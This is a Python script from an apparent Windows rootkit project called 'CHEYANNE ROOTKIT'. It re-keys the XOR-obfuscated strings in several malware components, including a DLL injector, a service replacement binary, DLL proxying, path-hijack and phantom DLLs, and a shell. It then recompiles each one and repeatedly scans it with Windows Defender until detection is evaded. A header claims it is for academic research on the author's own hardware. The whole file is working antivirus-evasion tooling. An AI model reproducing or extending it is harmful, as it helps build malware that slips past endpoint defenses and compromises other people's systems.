"""
CHEYANNE ROOTKIT — XOR Key Mutation Pipeline
TARGET: Own hardware only. Academic CSEC research.

Usage:
    python mutate.py                        # Rotate all components
    python mutate.py --target dark_room     # Rotate single component
    python mutate.py --dry-run              # Show what would change
    python mutate.py --status               # Show current keys
"""

import os
import sys
import re
import struct
import subprocess
import shutil
import tempfile
import argparse
import secrets
import glob
from datetime import datetime

if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        os.environ.setdefault("PYTHONIOENCODING", "utf-8")

ROOT = os.path.dirname(os.path.abspath(__file__))

MPCMDRUN = None
for p in sorted(glob.glob(r"C:\ProgramData\Microsoft\Windows Defender\Platform\*\MpCmdRun.exe"), reverse=True):
    MPCMDRUN = p
    break

try:
    from cheyanne_config import VCVARS
except ImportError:
    VCVARS = r"C:\Program Files\Microsoft Visual Studio\18\Community\VC\Auxiliary\Build\vcvars64.bat"

COMPONENTS = {
    "dark_room": {
        "source": os.path.join(ROOT, "dark_room", "dark_room_annotated.c"),
        "output_dir": os.path.join(ROOT, "dark_room"),
        "compile_flags": "/Fe:dark_room.exe /O1 /GS-",
        "link_libs": "",
        "binary": "dark_room.exe",
        "key_define": "XOR_KEY",
        "decode_fn_pattern": "xor_decode",
    },
    "inject_dll": {
        "source": os.path.join(ROOT, "injection", "vader_inject_dll_annotated.c"),
        "output_dir": os.path.join(ROOT, "injection"),
        "compile_flags": "/Fe:vader_inject.dll /LD /O1 /GS- /utf-8",
        "link_libs": "",
        "binary": "vader_inject.dll",
        "key_define": "XOR_KEY",
        "decode_fn_pattern": "xor_decode",
        "extra_sources": [
            os.path.join(ROOT, "injection", "gate.c"),
            os.path.join(ROOT, "injection", "gate_stub.obj"),
        ],
    },
    "inject_exe": {
        "source": os.path.join(ROOT, "injection", "vader_inject_annotated.c"),
        "output_dir": os.path.join(ROOT, "injection"),
        "compile_flags": "/Fe:vader_inject.exe /O1 /GS- /utf-8",
        "link_libs": "",
        "binary": "vader_inject.exe",
        "key_define": "XOR_KEY",
        "decode_fn_pattern": "xor_decode",
    },
    "v4_svc_replace": {
        "source": os.path.join(ROOT, "vectors", "v4_svc_replace", "svc_replace_annotated.c"),
        "output_dir": os.path.join(ROOT, "vectors", "v4_svc_replace"),
        "compile_flags": "/Fe:WsNativePushService.exe /O1 /GS- /utf-8",
        "link_libs": "advapi32.lib user32.lib",
        "binary": "WsNativePushService.exe",
        "key_define": "V4_KEY",
        "decode_fn_pattern": "v4_decode",
    },
    "v5_dll_proxy": {
        "source": os.path.join(ROOT, "vectors", "v5_dll_proxy", "version_proxy_annotated.c"),
        "output_dir": os.path.join(ROOT, "vectors", "v5_dll_proxy"),
        "compile_flags": "/Fe:VERSION.dll /LD /O1 /GS- /utf-8",
        "link_libs": "advapi32.lib user32.lib",
        "binary": "VERSION.dll",
        "key_define": "V5_KEY",
        "decode_fn_pattern": "v5_decode",
    },
    "v6_path_hijack": {
        "source": os.path.join(ROOT, "vectors", "v6_path_hijack", "path_hijack_dll_annotated.c"),
        "output_dir": os.path.join(ROOT, "vectors", "v6_path_hijack"),
        "compile_flags": "/Fe:targetname.dll /LD /O1 /utf-8",
        "link_libs": "advapi32.lib user32.lib",
        "binary": "targetname.dll",
        "key_define": "V6_KEY",
        "decode_fn_pattern": "v6_decode",
    },
    "v7_phantom_dll": {
        "source": os.path.join(ROOT, "vectors", "v7_phantom_dll", "phantom_dll_annotated.c"),
        "output_dir": os.path.join(ROOT, "vectors", "v7_phantom_dll"),
        "compile_flags": "/Fe:osppc.dll /LD /O1 /GS- /utf-8",
        "link_libs": "advapi32.lib user32.lib",
        "binary": "osppc.dll",
        "key_define": "V7_KEY",
        "decode_fn_pattern": "v7_decode",
    },
    "shell": {
        "source": os.path.join(ROOT, "shell", "vader_shell_annotated.c"),
        "output_dir": os.path.join(ROOT, "shell"),
        "compile_flags": "/Fe:vader_shell.exe /O1 /GS- /utf-8",
        "link_libs": "ws2_32.lib",
        "binary": "vader_shell.exe",
        "key_define": "XOR_KEY",
        "decode_fn_pattern": "XorDecode",
    },
}

# ═══════════════════════════════════════════════════════════════
# UTILITIES
# ═══════════════════════════════════════════════════════════════

def ts():
    return datetime.now().strftime("%Y%m%d_%H%M%S")

def log(msg, level="*"):
    print(f"  [{level}] {msg}")

def log_ok(msg):
    log(msg, "+")

def log_fail(msg):
    log(msg, "!")

def log_warn(msg):
    log(msg, "~")

def log_phase(title):
    sep = "─" * 50
    print(f"\n  ┌{sep}┐")
    print(f"  │  {title:<48s}│")
    print(f"  └{sep}┘")

def banner():
    print("=" * 60)
    print("  CHEYANNE ROOTKIT — XOR Key Mutation Pipeline")
    print("  22DIV / george wu")
    print("  TARGET: Own hardware only")
    print("=" * 60)

# ═══════════════════════════════════════════════════════════════
# PARSING
# ═══════════════════════════════════════════════════════════════

RE_DEFINE_KEY = re.compile(
    r'^(\s*#define\s+{key}\s+)(0x[0-9A-Fa-f]{{1,2}})\b'
)

RE_XOR_ARRAY = re.compile(
    r'(static\s+const\s+unsigned\s+char\s+(\w+)\s*\[\s*\]\s*=\s*\{)'
    r'([^}]+)'
    r'(\}\s*;)',
    re.DOTALL,
)

RE_INLINE_XOR = re.compile(
    r'(\bbuf\s*\[\s*i\s*\]\s*\^=\s*)(0x[0-9A-Fa-f]{1,2})(\s*;)'
)


def find_key_define(source_text, key_name):
    pattern = re.compile(
        rf'^(\s*#define\s+{re.escape(key_name)}\s+)(0x[0-9A-Fa-f]{{1,2}})\b',
        re.MULTILINE,
    )
    m = pattern.search(source_text)
    if m:
        return int(m.group(2), 16), m
    return None, None


def find_xor_arrays(source_text):
    arrays = []
    for m in RE_XOR_ARRAY.finditer(source_text):
        name = m.group(2)
        body = m.group(3)
        bytes_hex = re.findall(r'0x[0-9A-Fa-f]{1,2}', body)
        if bytes_hex:
            raw = [int(b, 16) for b in bytes_hex]
            arrays.append({
                "name": name,
                "match": m,
                "bytes": raw,
                "hex_strings": bytes_hex,
            })
    return arrays


def find_inline_xor_keys(source_text):
    return list(RE_INLINE_XOR.finditer(source_text))

# ═══════════════════════════════════════════════════════════════
# MUTATION
# ═══════════════════════════════════════════════════════════════

def gen_new_key(current_key):
    while True:
        k = secrets.randbelow(0x7F) + 0x80
        if k != current_key:
            return k


def re_encode_array(raw_bytes, old_key, new_key):
    plaintext = [(b ^ old_key) & 0xFF for b in raw_bytes]
    return [(b ^ new_key) & 0xFF for b in plaintext]


def format_hex_block(encoded_bytes, indent=4):
    lines = []
    for i in range(0, len(encoded_bytes), 8):
        chunk = encoded_bytes[i:i+8]
        hex_strs = [f"0x{b:02X}" for b in chunk]
        lines.append(" " * indent + ", ".join(hex_strs))
    return ",\n".join(lines)


def mutate_source(source_path, key_name, dry_run=False):
    with open(source_path, "r", encoding="utf-8") as f:
        source = f.read()

    old_key, key_match = find_key_define(source, key_name)
    if old_key is None:
        log_fail(f"Could not find #define {key_name} in {os.path.basename(source_path)}")
        return None, None

    arrays = find_xor_arrays(source)
    if not arrays:
        log_fail(f"No XOR arrays found in {os.path.basename(source_path)}")
        return None, None

    new_key = gen_new_key(old_key)

    log(f"Source: {os.path.basename(source_path)}")
    log(f"Key: {key_name} 0x{old_key:02X} → 0x{new_key:02X}")
    log(f"Arrays: {len(arrays)} ({', '.join(a['name'] for a in arrays)})")

    if dry_run:
        for arr in arrays:
            plain = [(b ^ old_key) & 0xFF for b in arr["bytes"]]
            safe = "".join(chr(b) if 32 <= b < 127 else "." for b in plain)
            log(f"  {arr['name']}: {len(arr['bytes'])}B → \"{safe}\"")
        return old_key, new_key

    replacements = []
    for arr in arrays:
        new_encoded = re_encode_array(arr["bytes"], old_key, new_key)
        new_body = "\n" + format_hex_block(new_encoded) + "\n"
        replacements.append((arr["match"], new_body))

    result = source
    for match, new_body in reversed(sorted(replacements, key=lambda r: r[0].start())):
        result = (
            result[:match.start(3)]
            + new_body
            + result[match.end(3):]
        )

    key_pattern = re.compile(
        rf'^(\s*#define\s+{re.escape(key_name)}\s+)0x[0-9A-Fa-f]{{1,2}}\b',
        re.MULTILINE,
    )
    result = key_pattern.sub(rf'\g<1>0x{new_key:02X}', result)

    inline_pattern = re.compile(
        rf'(\bbuf\s*\[\s*i\s*\]\s*\^=\s*)0x{old_key:02X}(\s*;)'
    )
    result = inline_pattern.sub(rf'\g<1>0x{new_key:02X}\2', result)

    with open(source_path, "w", encoding="utf-8", newline="\n") as f:
        f.write(result)

    log_ok(f"Wrote {os.path.basename(source_path)} with key 0x{new_key:02X}")
    return old_key, new_key

# ═══════════════════════════════════════════════════════════════
# COMPILE
# ═══════════════════════════════════════════════════════════════

def compile_component(comp):
    if not os.path.exists(VCVARS):
        log_fail(f"vcvars64.bat not found: {VCVARS}")
        return False
    if not os.path.exists(comp["source"]):
        log_fail(f"Source not found: {comp['source']}")
        return False

    output_dir = comp["output_dir"]
    os.makedirs(output_dir, exist_ok=True)

    binary_path = os.path.join(output_dir, comp["binary"])
    use_temp = False
    if os.path.exists(binary_path):
        try:
            os.remove(binary_path)
        except (PermissionError, OSError):
            use_temp = True
            log_warn(f"Old binary locked (Defender?) — compiling to temp dir")

    if use_temp:
        build_dir = tempfile.mkdtemp(prefix="cheyanne_build_")
    else:
        build_dir = output_dir

    extra = " ".join(f'"{s}"' for s in comp.get("extra_sources", []))
    extra_part = f" {extra}" if extra else ""
    link_part = f" /link {comp['link_libs']}" if comp["link_libs"] else ""
    cmd = f'"{VCVARS}" && cd /d "{build_dir}" && cl.exe "{comp["source"]}"{extra_part} {comp["compile_flags"]}{link_part}'

    log(f"Compiling {os.path.basename(comp['source'])}...")
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=120)

    if result.returncode != 0:
        stderr_lines = [l for l in result.stderr.split("\n") if "error" in l.lower()]
        for l in stderr_lines[:5]:
            log_fail(f"  {l.strip()}")
        if not stderr_lines:
            stdout_lines = [l for l in result.stdout.split("\n") if "error" in l.lower()]
            for l in stdout_lines[:5]:
                log_fail(f"  {l.strip()}")
        if use_temp:
            shutil.rmtree(build_dir, ignore_errors=True)
        return False

    if use_temp:
        tmp_binary = os.path.join(build_dir, comp["binary"])
        if os.path.exists(tmp_binary):
            try:
                os.replace(tmp_binary, binary_path)
                log_ok("Build OK (replaced locked binary)")
            except (PermissionError, OSError):
                shutil.copy2(tmp_binary, binary_path + ".new")
                log_ok(f"Build OK → {comp['binary']}.new (original Defender-locked)")
        shutil.rmtree(build_dir, ignore_errors=True)
    else:
        log_ok("Build OK")
    return True

# ═══════════════════════════════════════════════════════════════
# SCAN
# ═══════════════════════════════════════════════════════════════

def scan_binary(filepath):
    if not MPCMDRUN:
        return "NO_SCANNER"
    if not os.path.exists(filepath):
        return "NOT_FOUND"

    tmp_dir = tempfile.mkdtemp(prefix="cheyanne_mut_")
    tmp_path = os.path.join(tmp_dir, os.path.basename(filepath))

    try:
        shutil.copy2(filepath, tmp_path)
        result = subprocess.run(
            [MPCMDRUN, "-Scan", "-ScanType", "3", "-File", tmp_path,
             "-DisableRemediation"],
            capture_output=True, text=True, timeout=30,
        )
        if result.returncode == 0:
            return "CLEAN"
        elif result.returncode == 2:
            return "DETECTED"
        return f"RC={result.returncode}"
    except subprocess.TimeoutExpired:
        return "TIMEOUT"
    finally:
        try:
            os.remove(tmp_path)
            os.rmdir(tmp_dir)
        except OSError:
            pass

# ═══════════════════════════════════════════════════════════════
# ROTATE (mutate + compile + scan loop)
# ═══════════════════════════════════════════════════════════════

MAX_ATTEMPTS = 10

def rotate_component(name, comp, dry_run=False):
    log_phase(f"ROTATE — {name}")

    if not os.path.exists(comp["source"]):
        log_fail(f"Source not found: {comp['source']}")
        return False

    if dry_run:
        old_key, new_key = mutate_source(comp["source"], comp["key_define"], dry_run=True)
        if old_key is not None:
            log(f"[dry-run] Would rotate 0x{old_key:02X} → 0x{new_key:02X}, recompile, scan")
        return True

    with open(comp["source"], "r", encoding="utf-8") as f:
        backup = f.read()

    for attempt in range(1, MAX_ATTEMPTS + 1):
        log(f"Attempt {attempt}/{MAX_ATTEMPTS}")

        old_key, new_key = mutate_source(comp["source"], comp["key_define"])
        if old_key is None:
            log_fail("Mutation failed — restoring backup")
            with open(comp["source"], "w", encoding="utf-8", newline="\n") as f:
                f.write(backup)
            return False

        if not compile_component(comp):
            log_fail("Compile failed — restoring backup")
            with open(comp["source"], "w", encoding="utf-8", newline="\n") as f:
                f.write(backup)
            return False

        binary_path = os.path.join(comp["output_dir"], comp["binary"])
        new_path = binary_path + ".new"
        scan_target = new_path if os.path.exists(new_path) else binary_path
        scan_result = scan_binary(scan_target)
        log(f"Scan: {scan_result}")

        if scan_result == "CLEAN":
            if os.path.exists(new_path):
                try:
                    os.replace(new_path, binary_path)
                except (PermissionError, OSError):
                    pass
            log_ok(f"{name}: CLEAN at key 0x{new_key:02X} (attempt {attempt})")
            return True
        elif scan_result == "DETECTED":
            log_warn(f"DETECTED at 0x{new_key:02X} — rotating again...")
            continue
        elif scan_result == "NO_SCANNER":
            log_warn("No scanner available — accepting mutation without scan")
            return True
        else:
            log_warn(f"Scan returned {scan_result} — accepting mutation")
            return True

    log_fail(f"{name}: Still DETECTED after {MAX_ATTEMPTS} attempts")
    log_warn("Restoring original source")
    with open(comp["source"], "w", encoding="utf-8", newline="\n") as f:
        f.write(backup)
    return False

# ═══════════════════════════════════════════════════════════════
# STATUS
# ═══════════════════════════════════════════════════════════════

def show_status():
    log_phase("CURRENT XOR KEYS")
    for name, comp in COMPONENTS.items():
        if not os.path.exists(comp["source"]):
            log(f"{name:<20s} SOURCE MISSING")
            continue

        with open(comp["source"], "r", encoding="utf-8") as f:
            source = f.read()

        key_val, _ = find_key_define(source, comp["key_define"])
        arrays = find_xor_arrays(source)
        binary_path = os.path.join(comp["output_dir"], comp["binary"])
        built = "BUILT" if os.path.exists(binary_path) else "NOT BUILT"

        if key_val is not None:
            log(f"{name:<20s} {comp['key_define']}=0x{key_val:02X}  arrays={len(arrays):<3d} {built}")
        else:
            log(f"{name:<20s} KEY NOT FOUND  arrays={len(arrays):<3d} {built}")

# ═══════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(
        description="CHEYANNE ROOTKIT — XOR Key Mutation Pipeline",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--target", type=str,
                        choices=list(COMPONENTS.keys()),
                        help="Rotate single component")
    parser.add_argument("--dry-run", action="store_true",
                        help="Show what would change without modifying")
    parser.add_argument("--status", action="store_true",
                        help="Show current keys for all components")
    args = parser.parse_args()

    banner()

    if args.status:
        show_status()
        return

    if args.target:
        targets = {args.target: COMPONENTS[args.target]}
    else:
        targets = COMPONENTS

    results = {}
    for name, comp in targets.items():
        ok = rotate_component(name, comp, dry_run=args.dry_run)
        results[name] = ok

    log_phase("SUMMARY")
    for name, ok in results.items():
        marker = "+" if ok else "!"
        status = "OK" if ok else "FAILED"
        log(f"{name:<20s} {status}", marker)

    ok_count = sum(1 for v in results.values() if v)
    total = len(results)
    log(f"\n  {ok_count}/{total} components {'would rotate' if args.dry_run else 'rotated'} successfully")


if __name__ == "__main__":
    main()
